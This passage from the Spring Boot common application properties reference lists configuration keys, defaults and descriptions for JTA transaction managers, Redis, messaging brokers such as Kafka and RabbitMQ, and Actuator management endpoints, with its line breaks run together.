connections.spring.jta.bitronix.datasource.local-auto-commit= # The default auto-commit mode for local transactions.spring.jta.bitronix.datasource.login-timeout= # Timeout, in seconds, for establishing a database connection.spring.jta.bitronix.datasource.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.spring.jta.bitronix.datasource.max-pool-size=10 # The maximum size of the pool. 0 denotes no limit.spring.jta.bitronix.datasource.min-pool-size=0 # The minimum size of the pool.spring.jta.bitronix.datasource.prepared-statement-cache-size=0 # The target size of the prepared statement cache. 0 disables the cache.spring.jta.bitronix.datasource.share-transaction-connections=false # Whether connections in the ACCESSIBLE state can be shared within the context of a transaction.spring.jta.bitronix.datasource.test-query= # SQL query or statement used to validate a connection before returning it.spring.jta.bitronix.datasource.two-pc-ordering-position=1 # The position that this resource should take during two-phase commit (always first is Integer.MIN_VALUE, and always last is Integer.MAX_VALUE).spring.jta.bitronix.datasource.unique-name=dataSource # The unique name used to identify the resource during recovery.spring.jta.bitronix.datasource.use-tm-join=true # Whether TMJOIN should be used when starting XAResources.spring.jta.bitronix.properties.allow-multiple-lrc=false # Whether to allow multiple LRC resources to be enlisted into the same transaction.spring.jta.bitronix.properties.asynchronous2-pc=false # Whether to enable asynchronously execution of two phase commit.spring.jta.bitronix.properties.background-recovery-interval-seconds=60 # Interval in seconds at which to run the recovery process in the background.spring.jta.bitronix.properties.current-node-only-recovery=true # Whether to recover only the current node.spring.jta.bitronix.properties.debug-zero-resource-transaction=false # Whether to log the creation and commit call stacks of transactions executed without a single enlisted resource.spring.jta.bitronix.properties.default-transaction-timeout=60 # Default transaction timeout, in seconds.spring.jta.bitronix.properties.disable-jmx=false # Whether to enable JMX support.spring.jta.bitronix.properties.exception-analyzer= # Set the fully qualified name of the exception analyzer implementation to use.spring.jta.bitronix.properties.filter-log-status=false # Whether to enable filtering of logs so that only mandatory logs are written.spring.jta.bitronix.properties.force-batching-enabled=true # Whether disk forces are batched.spring.jta.bitronix.properties.forced-write-enabled=true # Whether logs are forced to disk.spring.jta.bitronix.properties.graceful-shutdown-interval=60 # Maximum amount of seconds the TM waits for transactions to get done before aborting them at shutdown time.spring.jta.bitronix.properties.jndi-transaction-synchronization-registry-name= # JNDI name of the TransactionSynchronizationRegistry.spring.jta.bitronix.properties.jndi-user-transaction-name= # JNDI name of the UserTransaction.spring.jta.bitronix.properties.journal=disk # Name of the journal. Can be &apos;disk&apos;, &apos;null&apos;, or a class name.spring.jta.bitronix.properties.log-part1-filename=btm1.tlog # Name of the first fragment of the journal.spring.jta.bitronix.properties.log-part2-filename=btm2.tlog # Name of the second fragment of the journal.spring.jta.bitronix.properties.max-log-size-in-mb=2 # Maximum size in megabytes of the journal fragments.spring.jta.bitronix.properties.resource-configuration-filename= # ResourceLoader configuration file name.spring.jta.bitronix.properties.server-id= # ASCII ID that must uniquely identify this TM instance. Defaults to the machine&apos;s IP address.spring.jta.bitronix.properties.skip-corrupted-logs=false # Skip corrupted transactions log entries.spring.jta.bitronix.properties.warn-about-zero-resource-transaction=true # Whether to log a warning for transactions executed without a single enlisted resource.# NARAYANA (NarayanaProperties)spring.jta.narayana.default-timeout=60s # Transaction timeout. If a duration suffix is not specified, seconds will be used.spring.jta.narayana.expiry-scanners=com.arjuna.ats.internal.arjuna.recovery.ExpiredTransactionStatusManagerScanner # Comma-separated list of expiry scanners.spring.jta.narayana.log-dir= # Transaction object store directory.spring.jta.narayana.one-phase-commit=true # Whether to enable one phase commit optimization.spring.jta.narayana.periodic-recovery-period=120s # Interval in which periodic recovery scans are performed. If a duration suffix is not specified, seconds will be used.spring.jta.narayana.recovery-backoff-period=10s # Back off period between first and second phases of the recovery scan. If a duration suffix is not specified, seconds will be used.spring.jta.narayana.recovery-db-pass= # Database password to be used by the recovery manager.spring.jta.narayana.recovery-db-user= # Database username to be used by the recovery manager.spring.jta.narayana.recovery-jms-pass= # JMS password to be used by the recovery manager.spring.jta.narayana.recovery-jms-user= # JMS username to be used by the recovery manager.spring.jta.narayana.recovery-modules= # Comma-separated list of recovery modules.spring.jta.narayana.transaction-manager-id=1 # Unique transaction manager id.spring.jta.narayana.xa-resource-orphan-filters= # Comma-separated list of orphan filters.# EMBEDDED MONGODB (EmbeddedMongoProperties)spring.mongodb.embedded.features=sync_delay # Comma-separated list of features to enable.spring.mongodb.embedded.storage.database-dir= # Directory used for data storage.spring.mongodb.embedded.storage.oplog-size= # Maximum size of the oplog, in megabytes.spring.mongodb.embedded.storage.repl-set-name= # Name of the replica set.spring.mongodb.embedded.version=3.2.2 # Version of Mongo to use.# REDIS (RedisProperties)spring.redis.cluster.max-redirects= # Maximum number of redirects to follow when executing commands across the cluster.spring.redis.cluster.nodes= # Comma-separated list of &quot;host:port&quot; pairs to bootstrap from.spring.redis.database=0 # Database index used by the connection factory.spring.redis.url= # Connection URL. Overrides host, port, and password. User is ignored. Example: redis://user:password@example.com:6379spring.redis.host=localhost # Redis server host.spring.redis.jedis.pool.max-active=8 # Maximum number of connections that can be allocated by the pool at a given time. Use a negative value for no limit.spring.redis.jedis.pool.max-idle=8 # Maximum number of &quot;idle&quot; connections in the pool. Use a negative value to indicate an unlimited number of idle connections.spring.redis.jedis.pool.max-wait=-1ms # Maximum amount of time a connection allocation should block before throwing an exception when the pool is exhausted. Use a negative value to block indefinitely.spring.redis.jedis.pool.min-idle=0 # Target for the minimum number of idle connections to maintain in the pool. This setting only has an effect if it is positive.spring.redis.lettuce.pool.max-active=8 # Maximum number of connections that can be allocated by the pool at a given time. Use a negative value for no limit.spring.redis.lettuce.pool.max-idle=8 # Maximum number of &quot;idle&quot; connections in the pool. Use a negative value to indicate an unlimited number of idle connections.spring.redis.lettuce.pool.max-wait=-1ms # Maximum amount of time a connection allocation should block before throwing an exception when the pool is exhausted. Use a negative value to block indefinitely.spring.redis.lettuce.pool.min-idle=0 # Target for the minimum number of idle connections to maintain in the pool. This setting only has an effect if it is positive.spring.redis.lettuce.shutdown-timeout=100ms # Shutdown timeout.spring.redis.password= # Login password of the redis server.spring.redis.port=6379 # Redis server port.spring.redis.sentinel.master= # Name of the Redis server.spring.redis.sentinel.nodes= # Comma-separated list of &quot;host:port&quot; pairs.spring.redis.ssl=false # Whether to enable SSL support.spring.redis.timeout= # Connection timeout.# TRANSACTION (TransactionProperties)spring.transaction.default-timeout= # Default transaction timeout. If a duration suffix is not specified, seconds will be used.spring.transaction.rollback-on-commit-failure= # Whether to roll back on commit failures.# ----------------------------------------# INTEGRATION PROPERTIES# ----------------------------------------# ACTIVEMQ (ActiveMQProperties)spring.activemq.broker-url= # URL of the ActiveMQ broker. Auto-generated by default.spring.activemq.close-timeout=15s # Time to wait before considering a close complete.spring.activemq.in-memory=true # Whether the default broker URL should be in memory. Ignored if an explicit broker has been specified.spring.activemq.non-blocking-redelivery=false # Whether to stop message delivery before re-delivering messages from a rolled back transaction. This implies that message order is not preserved when this is enabled.spring.activemq.password= # Login password of the broker.spring.activemq.send-timeout=0ms # Time to wait on message sends for a response. Set it to 0 to wait forever.spring.activemq.user= # Login user of the broker.spring.activemq.packages.trust-all= # Whether to trust all packages.spring.activemq.packages.trusted= # Comma-separated list of specific packages to trust (when not trusting all packages).spring.activemq.pool.block-if-full=true # Whether to block when a connection is requested and the pool is full. Set it to false to throw a &quot;JMSException&quot; instead.spring.activemq.pool.block-if-full-timeout=-1ms # Blocking period before throwing an exception if the pool is still full.spring.activemq.pool.create-connection-on-startup=true # Whether to create a connection on startup. Can be used to warm up the pool on startup.spring.activemq.pool.enabled=false # Whether a PooledConnectionFactory should be created, instead of a regular ConnectionFactory.spring.activemq.pool.expiry-timeout=0ms # Connection expiration timeout.spring.activemq.pool.idle-timeout=30s # Connection idle timeout.spring.activemq.pool.max-connections=1 # Maximum number of pooled connections.spring.activemq.pool.maximum-active-session-per-connection=500 # Maximum number of active sessions per connection.spring.activemq.pool.reconnect-on-exception=true # Reset the connection when a &quot;JMSException&quot; occurs.spring.activemq.pool.time-between-expiration-check=-1ms # Time to sleep between runs of the idle connection eviction thread. When negative, no idle connection eviction thread runs.spring.activemq.pool.use-anonymous-producers=true # Whether to use only one anonymous &quot;MessageProducer&quot; instance. Set it to false to create one &quot;MessageProducer&quot; every time one is required.# ARTEMIS (ArtemisProperties)spring.artemis.embedded.cluster-password= # Cluster password. Randomly generated on startup by default.spring.artemis.embedded.data-directory= # Journal file directory. Not necessary if persistence is turned off.spring.artemis.embedded.enabled=true # Whether to enable embedded mode if the Artemis server APIs are available.spring.artemis.embedded.persistent=false # Whether to enable persistent store.spring.artemis.embedded.queues= # Comma-separated list of queues to create on startup.spring.artemis.embedded.server-id= # Server ID. By default, an auto-incremented counter is used.spring.artemis.embedded.topics= # Comma-separated list of topics to create on startup.spring.artemis.host=localhost # Artemis broker host.spring.artemis.mode= # Artemis deployment mode, auto-detected by default.spring.artemis.password= # Login password of the broker.spring.artemis.port=61616 # Artemis broker port.spring.artemis.user= # Login user of the broker.# SPRING BATCH (BatchProperties)spring.batch.initialize-schema=embedded # Database schema initialization mode.spring.batch.job.enabled=true # Execute all Spring Batch jobs in the context on startup.spring.batch.job.names= # Comma-separated list of job names to execute on startup (for instance, `job1,job2`). By default, all Jobs found in the context are executed.spring.batch.schema=classpath:org/springframework/batch/core/schema-@@platform@@.sql # Path to the SQL file to use to initialize the database schema.spring.batch.table-prefix= # Table prefix for all the batch meta-data tables.# SPRING INTEGRATION (IntegrationProperties)spring.integration.jdbc.initialize-schema=embedded # Database schema initialization mode.spring.integration.jdbc.schema=classpath:org/springframework/integration/jdbc/schema-@@platform@@.sql # Path to the SQL file to use to initialize the database schema.# JMS (JmsProperties)spring.jms.jndi-name= # Connection factory JNDI name. When set, takes precedence to others connection factory auto-configurations.spring.jms.listener.acknowledge-mode= # Acknowledge mode of the container. By default, the listener is transacted with automatic acknowledgment.spring.jms.listener.auto-startup=true # Start the container automatically on startup.spring.jms.listener.concurrency= # Minimum number of concurrent consumers.spring.jms.listener.max-concurrency= # Maximum number of concurrent consumers.spring.jms.pub-sub-domain=false # Whether the default destination type is topic.spring.jms.template.default-destination= # Default destination to use on send and receive operations that do not have a destination parameter.spring.jms.template.delivery-delay= # Delivery delay to use for send calls.spring.jms.template.delivery-mode= # Delivery mode. Enables QoS (Quality of Service) when set.spring.jms.template.priority= # Priority of a message when sending. Enables QoS (Quality of Service) when set.spring.jms.template.qos-enabled= # Whether to enable explicit QoS (Quality of Service) when sending a message.spring.jms.template.receive-timeout= # Timeout to use for receive calls.spring.jms.template.time-to-live= # Time-to-live of a message when sending. Enables QoS (Quality of Service) when set.# APACHE KAFKA (KafkaProperties)spring.kafka.admin.client-id= # ID to pass to the server when making requests. Used for server-side logging.spring.kafka.admin.fail-fast=false # Whether to fail fast if the broker is not available on startup.spring.kafka.admin.properties.*= # Additional admin-specific properties used to configure the client.spring.kafka.admin.ssl.key-password= # Password of the private key in the key store file.spring.kafka.admin.ssl.keystore-location= # Location of the key store file.spring.kafka.admin.ssl.keystore-password= # Store password for the key store file.spring.kafka.admin.ssl.truststore-location= # Location of the trust store file.spring.kafka.admin.ssl.truststore-password= # Store password for the trust store file.spring.kafka.bootstrap-servers= # Comma-delimited list of host:port pairs to use for establishing the initial connection to the Kafka cluster.spring.kafka.client-id= # ID to pass to the server when making requests. Used for server-side logging.spring.kafka.consumer.auto-commit-interval= # Frequency with which the consumer offsets are auto-committed to Kafka if &apos;enable.auto.commit&apos; is set to true.spring.kafka.consumer.auto-offset-reset= # What to do when there is no initial offset in Kafka or if the current offset no longer exists on the server.spring.kafka.consumer.bootstrap-servers= # Comma-delimited list of host:port pairs to use for establishing the initial connection to the Kafka cluster.spring.kafka.consumer.client-id= # ID to pass to the server when making requests. Used for server-side logging.spring.kafka.consumer.enable-auto-commit= # Whether the consumer&apos;s offset is periodically committed in the background.spring.kafka.consumer.fetch-max-wait= # Maximum amount of time the server blocks before answering the fetch request if there isn&apos;t sufficient data to immediately satisfy the requirement given by &quot;fetch.min.bytes&quot;.spring.kafka.consumer.fetch-min-size= # Minimum amount of data, in bytes, the server should return for a fetch request.spring.kafka.consumer.group-id= # Unique string that identifies the consumer group to which this consumer belongs.spring.kafka.consumer.heartbeat-interval= # Expected time between heartbeats to the consumer coordinator.spring.kafka.consumer.key-deserializer= # Deserializer class for keys.spring.kafka.consumer.max-poll-records= # Maximum number of records returned in a single call to poll().spring.kafka.consumer.properties.*= # Additional consumer-specific properties used to configure the client.spring.kafka.consumer.ssl.key-password= # Password of the private key in the key store file.spring.kafka.consumer.ssl.keystore-location= # Location of the key store file.spring.kafka.consumer.ssl.keystore-password= # Store password for the key store file.spring.kafka.consumer.ssl.truststore-location= # Location of the trust store file.spring.kafka.consumer.ssl.truststore-password= # Store password for the trust store file.spring.kafka.consumer.value-deserializer= # Deserializer class for values.spring.kafka.jaas.control-flag=required # Control flag for login configuration.spring.kafka.jaas.enabled=false # Whether to enable JAAS configuration.spring.kafka.jaas.login-module=com.sun.security.auth.module.Krb5LoginModule # Login module.spring.kafka.jaas.options= # Additional JAAS options.spring.kafka.listener.ack-count= # Number of records between offset commits when ackMode is &quot;COUNT&quot; or &quot;COUNT_TIME&quot;.spring.kafka.listener.ack-mode= # Listener AckMode. See the spring-kafka documentation.spring.kafka.listener.ack-time= # Time between offset commits when ackMode is &quot;TIME&quot; or &quot;COUNT_TIME&quot;.spring.kafka.listener.client-id= # Prefix for the listener&apos;s consumer client.id property.spring.kafka.listener.concurrency= # Number of threads to run in the listener containers.spring.kafka.listener.idle-event-interval= # Time between publishing idle consumer events (no data received).spring.kafka.listener.log-container-config= # Whether to log the container configuration during initialization (INFO level).spring.kafka.listener.monitor-interval= # Time between checks for non-responsive consumers. If a duration suffix is not specified, seconds will be used.spring.kafka.listener.no-poll-threshold= # Multiplier applied to &quot;pollTimeout&quot; to determine if a consumer is non-responsive.spring.kafka.listener.poll-timeout= # Timeout to use when polling the consumer.spring.kafka.listener.type=single # Listener type.spring.kafka.producer.acks= # Number of acknowledgments the producer requires the leader to have received before considering a request complete.spring.kafka.producer.batch-size= # Number of records to batch before sending.spring.kafka.producer.bootstrap-servers= # Comma-delimited list of host:port pairs to use for establishing the initial connection to the Kafka cluster.spring.kafka.producer.buffer-memory= # Total bytes of memory the producer can use to buffer records waiting to be sent to the server.spring.kafka.producer.client-id= # ID to pass to the server when making requests. Used for server-side logging.spring.kafka.producer.compression-type= # Compression type for all data generated by the producer.spring.kafka.producer.key-serializer= # Serializer class for keys.spring.kafka.producer.properties.*= # Additional producer-specific properties used to configure the client.spring.kafka.producer.retries= # When greater than zero, enables retrying of failed sends.spring.kafka.producer.ssl.key-password= # Password of the private key in the key store file.spring.kafka.producer.ssl.keystore-location= # Location of the key store file.spring.kafka.producer.ssl.keystore-password= # Store password for the key store file.spring.kafka.producer.ssl.truststore-location= # Location of the trust store file.spring.kafka.producer.ssl.truststore-password= # Store password for the trust store file.spring.kafka.producer.transaction-id-prefix= # When non empty, enables transaction support for producer.spring.kafka.producer.value-serializer= # Serializer class for values.spring.kafka.properties.*= # Additional properties, common to producers and consumers, used to configure the client.spring.kafka.ssl.key-password= # Password of the private key in the key store file.spring.kafka.ssl.keystore-location= # Location of the key store file.spring.kafka.ssl.keystore-password= # Store password for the key store file.spring.kafka.ssl.truststore-location= # Location of the trust store file.spring.kafka.ssl.truststore-password= # Store password for the trust store file.spring.kafka.template.default-topic= # Default topic to which messages are sent.# RABBIT (RabbitProperties)spring.rabbitmq.addresses= # Comma-separated list of addresses to which the client should connect.spring.rabbitmq.cache.channel.checkout-timeout= # Duration to wait to obtain a channel if the cache size has been reached.spring.rabbitmq.cache.channel.size= # Number of channels to retain in the cache.spring.rabbitmq.cache.connection.mode=channel # Connection factory cache mode.spring.rabbitmq.cache.connection.size= # Number of connections to cache.spring.rabbitmq.connection-timeout= # Connection timeout. Set it to zero to wait forever.spring.rabbitmq.dynamic=true # Whether to create an AmqpAdmin bean.spring.rabbitmq.host=localhost # RabbitMQ host.spring.rabbitmq.listener.direct.acknowledge-mode= # Acknowledge mode of container.spring.rabbitmq.listener.direct.auto-startup=true # Whether to start the container automatically on startup.spring.rabbitmq.listener.direct.consumers-per-queue= # Number of consumers per queue.spring.rabbitmq.listener.direct.default-requeue-rejected= # Whether rejected deliveries are re-queued by default.spring.rabbitmq.listener.direct.idle-event-interval= # How often idle container events should be published.spring.rabbitmq.listener.direct.prefetch= # Number of messages to be handled in a single request. It should be greater than or equal to the transaction size (if used).spring.rabbitmq.listener.direct.retry.enabled=false # Whether publishing retries are enabled.spring.rabbitmq.listener.direct.retry.initial-interval=1000ms # Duration between the first and second attempt to deliver a message.spring.rabbitmq.listener.direct.retry.max-attempts=3 # Maximum number of attempts to deliver a message.spring.rabbitmq.listener.direct.retry.max-interval=10000ms # Maximum duration between attempts.spring.rabbitmq.listener.direct.retry.multiplier=1 # Multiplier to apply to the previous retry interval.spring.rabbitmq.listener.direct.retry.stateless=true # Whether retries are stateless or stateful.spring.rabbitmq.listener.simple.acknowledge-mode= # Acknowledge mode of container.spring.rabbitmq.listener.simple.auto-startup=true # Whether to start the container automatically on startup.spring.rabbitmq.listener.simple.concurrency= # Minimum number of listener invoker threads.spring.rabbitmq.listener.simple.default-requeue-rejected= # Whether rejected deliveries are re-queued by default.spring.rabbitmq.listener.simple.idle-event-interval= # How often idle container events should be published.spring.rabbitmq.listener.simple.max-concurrency= # Maximum number of listener invoker threads.spring.rabbitmq.listener.simple.prefetch= # Number of messages to be handled in a single request. It should be greater than or equal to the transaction size (if used).spring.rabbitmq.listener.simple.retry.enabled=false # Whether publishing retries are enabled.spring.rabbitmq.listener.simple.retry.initial-interval=1000ms # Duration between the first and second attempt to deliver a message.spring.rabbitmq.listener.simple.retry.max-attempts=3 # Maximum number of attempts to deliver a message.spring.rabbitmq.listener.simple.retry.max-interval=10000ms # Maximum duration between attempts.spring.rabbitmq.listener.simple.retry.multiplier=1 # Multiplier to apply to the previous retry interval.spring.rabbitmq.listener.simple.retry.stateless=true # Whether retries are stateless or stateful.spring.rabbitmq.listener.simple.transaction-size= # Number of messages to be processed in a transaction. That is, the number of messages between acks. For best results, it should be less than or equal to the prefetch count.spring.rabbitmq.listener.type=simple # Listener container type.spring.rabbitmq.password=guest # Login to authenticate against the broker.spring.rabbitmq.port=5672 # RabbitMQ port.spring.rabbitmq.publisher-confirms=false # Whether to enable publisher confirms.spring.rabbitmq.publisher-returns=false # Whether to enable publisher returns.spring.rabbitmq.requested-heartbeat= # Requested heartbeat timeout; zero for none. If a duration suffix is not specified, seconds will be used.spring.rabbitmq.ssl.enabled=false # Whether to enable SSL support.spring.rabbitmq.ssl.key-store= # Path to the key store that holds the SSL certificate.spring.rabbitmq.ssl.key-store-password= # Password used to access the key store.spring.rabbitmq.ssl.key-store-type=PKCS12 # Key store type.spring.rabbitmq.ssl.trust-store= # Trust store that holds SSL certificates.spring.rabbitmq.ssl.trust-store-password= # Password used to access the trust store.spring.rabbitmq.ssl.trust-store-type=JKS # Trust store type.spring.rabbitmq.ssl.algorithm= # SSL algorithm to use. By default, configured by the Rabbit client library.spring.rabbitmq.template.exchange= # Name of the default exchange to use for send operations.spring.rabbitmq.template.mandatory= # Whether to enable mandatory messages.spring.rabbitmq.template.receive-timeout= # Timeout for `receive()` operations.spring.rabbitmq.template.reply-timeout= # Timeout for `sendAndReceive()` operations.spring.rabbitmq.template.retry.enabled=false # Whether publishing retries are enabled.spring.rabbitmq.template.retry.initial-interval=1000ms # Duration between the first and second attempt to deliver a message.spring.rabbitmq.template.retry.max-attempts=3 # Maximum number of attempts to deliver a message.spring.rabbitmq.template.retry.max-interval=10000ms # Maximum duration between attempts.spring.rabbitmq.template.retry.multiplier=1 # Multiplier to apply to the previous retry interval.spring.rabbitmq.template.routing-key= # Value of a default routing key to use for send operations.spring.rabbitmq.username=guest # Login user to authenticate to the broker.spring.rabbitmq.virtual-host= # Virtual host to use when connecting to the broker.# ----------------------------------------# ACTUATOR PROPERTIES# ----------------------------------------# MANAGEMENT HTTP SERVER (ManagementServerProperties)management.server.add-application-context-header=false # Add the &quot;X-Application-Context&quot; HTTP header in each response.management.server.address= # Network address to which the management endpoints should bind. Requires a custom management.server.port.management.server.port= # Management endpoint HTTP port (uses the same port as the application by default). Configure a different port to use management-specific SSL.management.server.servlet.context-path= # Management endpoint context-path (for instance, `/management`). Requires a custom management.server.port.management.server.ssl.ciphers= # Supported SSL ciphers. Requires a custom management.port.management.server.ssl.client-auth= # Whether client authentication is wanted (&quot;want&quot;) or needed (&quot;need&quot;). Requires a trust store. Requires a custom management.server.port.management.server.ssl.enabled= # Whether to enable SSL support. Requires a custom management.server.port.management.server.ssl.enabled-protocols= # Enabled SSL protocols. Requires a custom management.server.port.management.server.ssl.key-alias= # Alias that identifies the key in the key store. Requires a custom management.server.port.management.server.ssl.key-password= # Password used to access the key in the key store. Requires a custom management.server.port.management.server.ssl.key-store= # Path to the key store that holds the SSL certificate (typically a jks file). Requires a custom management.server.port.management.server.ssl.key-store-password= # Password used to access the key store. Requires a custom management.server.port.management.server.ssl.key-store-provider= # Provider for the key store. Requires a custom management.server.port.management.server.ssl.key-store-type= # Type of the key store. Requires a custom management.server.port.management.server.ssl.protocol=TLS # SSL protocol to use. Requires a custom management.server.port.management.server.ssl.trust-store= # Trust store that holds SSL certificates. Requires a custom management.server.port.management.server.ssl.trust-store-password= # Password used to access the trust store. Requires a custom management.server.port.management.server.ssl.trust-store-provider= # Provider for the trust store. Requires a custom management.server.port.management.server.ssl.trust-store-type= # Type of the trust store. Requires a custom management.server.port.# CLOUDFOUNDRYmanagement.cloudfoundry.enabled=true # Whether to enable extended Cloud Foundry actuator endpoints.management.cloudfoundry.skip-ssl-validation=false # Whether to skip SSL verification for Cloud Foundry actuator endpoint security calls.# ENDPOINTS GENERAL CONFIGURATIONmanagement.endpoints.enabled-by-default= # Whether to enable or disable all endpoints by default.# ENDPOINTS JMX CONFIGURATION (JmxEndpointProperties)management.endpoints.jmx.domain=org.springframework.boot # Endpoints JMX domain name. Fallback to &apos;spring.jmx.default-domain&apos; if set.management.endpoints.jmx.exposure.include=* # Endpoint IDs that should be included or &apos;*&apos; for all.management.endpoints.jmx.exposure.exclude= # Endpoint IDs that should be excluded.management.endpoints.jmx.static-names= # Additional static properties to append to all ObjectNames of MBeans representing Endpoints.management.endpoints.jmx.unique-names=false # Whether to ensure that ObjectNames are modified in case of conflict.# ENDPOINTS WEB CONFIGURATION (WebEndpointProperties)management.endpoints.web.exposure.include=health,info # Endpoint IDs that should be included or &apos;*&apos; for all.management.endpoints.web.exposure.exclude= # Endpoint IDs that should be excluded.management.endpoints.web.base-path=/actuator # Base path for Web endpoints. Relative to server.servlet.context-path or management.server.servlet.context-path if management.server.port is configured.management.endpoints.web.path-mapping= # Mapping between endpoint IDs and the path that should expose them.# ENDPOINTS CORS CONFIGURATION (CorsEndpointProperties)management.endpoints.web.cors.allow-credentials= # Whether credentials are supported. When not set, credentials are not supported.management.endpoints.web.cors.allowed-headers= # Comma-separated list of headers to allow in a request. &apos;*&apos; allows all headers.management.endpoints.web.cors.allowed-methods= # Comma-separated list of methods to allow. &apos;*&apos; allows all methods. When not set, defaults to GET.management.endpoints.web.cors.allowed-origins= # Comma-separated list of origins to allow. &apos;*&apos; allows all origins. When not set, CORS support is disabled.management.endpoints.web.cors.exposed-headers= # Comma-separated list of headers to include in a response.management.endpoints.web.cors.max-age=1800s # How long the response from a pre-flight request can be cached by clients. If a duration suffix is not specified, seconds will be used.# AUDIT EVENTS ENDPOINT (AuditEventsEndpoint)management.endpoint.auditevents.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.auditevents.enabled=true # Whether to enable the auditevents endpoint.# BEANS ENDPOINT (BeansEndpoint)management.endpoint.beans.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.beans.enabled=true # Whether to enable the beans endpoint.# CONDITIONS REPORT ENDPOINT (ConditionsReportEndpoint)management.endpoint.conditions.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.conditions.enabled=true # Whether to enable the conditions endpoint.# CONFIGURATION PROPERTIES REPORT ENDPOINT (ConfigurationPropertiesReportEndpoint, ConfigurationPropertiesReportEndpointProperties)management.endpoint.configprops.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.configprops.enabled=true # Whether to enable the configprops endpoint.management.endpoint.configprops.keys-to-sanitize=password,secret,key,token,.*credentials.*,vcap_services # Keys that should be sanitized. Keys can be simple strings that the property ends with or regular expressions.# ENVIRONMENT ENDPOINT (EnvironmentEndpoint, EnvironmentEndpointProperties)management.endpoint.env.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.env.enabled=true # Whether to enable the env endpoint.management.endpoint.env.keys-to-sanitize=password,secret,key,token,.*credentials.*,vcap_services # Keys that should be sanitized. Keys can be simple strings that the property ends with or regular expressions.# FLYWAY ENDPOINT (FlywayEndpoint)management.endpoint.flyway.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.flyway.enabled=true # Whether to enable the flyway endpoint.# HEALTH ENDPOINT (HealthEndpoint, HealthEndpointProperties)management.endpoint.health.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.health.enabled=true # Whether to enable the health endpoint.management.endpoint.health.roles= # Roles used to determine whether or not a user is authorized to be shown details. When empty, all authenticated users are authorized.management.endpoint.health.show-details=never # When to show full health details.# HEAP DUMP ENDPOINT (HeapDumpWebEndpoint)management.endpoint.heapdump.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.heapdump.enabled=true # Whether to enable the heapdump endpoint.# HTTP TRACE ENDPOINT (HttpTraceEndpoint)management.endpoint.httptrace.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.httptrace.enabled=true # Whether to enable the httptrace endpoint.# INFO ENDPOINT (InfoEndpoint)info= # Arbitrary properties to add to the info endpoint.management.endpoint.info.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.info.enabled=true # Whether to enable the info endpoint.# JOLOKIA ENDPOINT (JolokiaProperties)management.endpoint.jolokia.config.*= # Jolokia settings. Refer to the documentation of Jolokia for more details.management.endpoint.jolokia.enabled=true # Whether to enable the jolokia endpoint.# LIQUIBASE ENDPOINT (LiquibaseEndpoint)management.endpoint.liquibase.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.liquibase.enabled=true # Whether to enable the liquibase endpoint.# LOG FILE ENDPOINT (LogFileWebEndpoint, LogFileWebEndpointProperties)management.endpoint.logfile.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.logfile.enabled=true # Whether to enable the logfile endpoint.management.endpoint.logfile.external-file= # External Logfile to be accessed. Can be used if the logfile is written by output redirect and not by the logging system itself.# LOGGERS ENDPOINT (LoggersEndpoint)management.endpoint.loggers.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.loggers.enabled=true # Whether to enable the loggers endpoint.# REQUEST MAPPING ENDPOINT (MappingsEndpoint)management.endpoint.mappings.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.mappings.enabled=true # Whether to enable the mappings endpoint.# METRICS ENDPOINT (MetricsEndpoint)management.endpoint.metrics.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.metrics.enabled=true # Whether to enable the metrics endpoint.# PROMETHEUS ENDPOINT (PrometheusScrapeEndpoint)management.endpoint.prometheus.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.prometheus.enabled=true # Whether to enable the prometheus endpoint.# SCHEDULED TASKS ENDPOINT (ScheduledTasksEndpoint)management.endpoint.scheduledtasks.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.scheduledtasks.enabled=true # Whether to enable the scheduledtasks endpoint.# SESSIONS ENDPOINT (SessionsEndpoint)management.endpoint.sessions.enabled=true # Whether to enable the sessions endpoint.# SHUTDOWN ENDPOINT (ShutdownEndpoint)management.endpoint.shutdown.enabled=false # Whether to enable the shutdown endpoint.# THREAD DUMP ENDPOINT (ThreadDumpEndpoint)management.endpoint.threaddump.cache.time-to-live=0ms # Maximum time that a response can be cached.management.endpoint.threaddump.enabled=true # Whether to enable the threaddump endpoint.# HEALTH INDICATORSmanagement.health.db.enabled=true # Whether to enable database health check.management.health.cassandra.enabled=true # Whether to enable Cassandra health check.management.health.couchbase.enabled=true # Whether to enable Couchbase health check.management.health.defaults.enabled=true # Whether to enable default health indicators.management.health.diskspace.enabled=true # Whether to enable disk space health check.management.health.diskspace.path= # Path used to compute the available disk space.management.health.diskspace.threshold=0 # Minimum disk space, in bytes, that should be available.management.health.elasticsearch.enabled=true # Whether to enable Elasticsearch health check.management.health.elasticsearch.indices= # Comma-separated index names.management.health.elasticsearch.response-timeout=100ms # Time to wait for a response from the cluster.management.health.influxdb.enabled=true # Whether to enable InfluxDB health check.management.health.jms.enabled=true # Whether to enable JMS health check.management.health.ldap.enabled=true # Whether to enable LDAP health check.management.health.mail.enabled=true # Whether to enable Mail health check.management.health.mongo.enabled=true # Whether to enable MongoDB health check.management.health.neo4j.enabled=true # Whether to enable Neo4j health check.management.health.rabbit.enabled=true # Whether to enable RabbitMQ health check.management.health.redis.enabled=true # Whether to enable Redis health check.management.health.solr.enabled=true # Whether to enable Solr health check.management.health.status.http-mapping= # Mapping of health statuses to HTTP status codes. By default, registered health statuses map to sensible defaults (for example, UP maps to 200).management.health.status.order=DOWN,OUT_OF_SERVICE,UP,UNKNOWN # Comma-separated list of health statuses in order of severity.# HTTP TRACING (HttpTraceProperties)management.trace.http.enabled=true # Whether to enable HTTP request-response tracing.management.trace.http.include=request-headers,response-headers,cookies,errors # Items to be included in the trace.# INFO CONTRIBUTORS (InfoContributorProperties)management.info.build.enabled=true # Whether to enable build 